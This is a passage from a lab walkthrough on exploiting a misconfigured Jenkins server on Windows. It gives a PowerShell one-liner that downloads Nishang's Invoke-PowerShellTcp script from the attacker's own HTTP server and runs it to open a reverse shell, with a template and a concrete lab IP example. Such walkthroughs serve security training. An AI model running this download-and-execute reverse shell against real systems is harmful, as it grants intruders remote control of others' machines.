We'll learn how to exploit a common misconfiguration on a widely used automation server(Jenkins - This tool is used to create continuous integration/continuous 
development pipelines that allow developers to automatically deploy their code once they made change to it). After which, we'll use an interesting privilege escalation 
method to get full system access. 

Since this is a Windows application, we'll be using [Nishang](https://github.com/samratashok/nishang) to gain initial access. The repository contains a useful set of 
scripts for initial access, enumeration and privilege escalation. In this case, we'll be using 
the [reverse shell scripts](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)


Find a feature of the tool(Jenkins) that allows you to execute commands on the underlying system. When you find this feature, you can use this command to get the 
reverse shell on your machine and then run it: 
```
powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
```
E.g. in our case it is:
```
powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.117.113:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.117.113 -Port 4444
```
![image](https://github.com/vivekprm/hackers-manual/assets/2403660/394a4a8f-7da9-4be6-bc02-5b35539d92d0)

You first need to download the [Powershell script](https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1), and make it available 
for the server to download. You can do this by creating a http server with python: 
```sh
python3 -m http.server
```

# Switching Shells
